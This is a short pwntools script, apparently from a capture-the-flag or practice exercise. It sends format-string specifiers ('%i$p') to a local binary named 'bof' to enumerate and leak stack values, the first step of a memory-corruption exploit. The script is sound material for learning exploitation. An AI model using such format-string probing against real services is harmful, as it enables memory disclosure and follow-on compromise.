#!/usr/bin/python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'
for i in range(1,70):
    try:
        p = process('./bof')
        temp = f'%{i}$p'

        p.sendlineafter(b'your name: ', temp.encode())
        p.recvuntil(b'0x')
        leak = '0x' + p.recv(12).decode()
        p.sendlineafter(b"Input your string: ",b'none')

        print(f'{i}: {leak}')
        p.close()
    except KeyboardInterrupt:
        print('OK bro')
    except:
        pass
# p = process('./bof')
# p.sendlineafter(b'your name: ', '%15$p'.encode())
# p.recvuntil(b'0x')
# leak = '0x' + p.recv(12).decode()
# print(leak)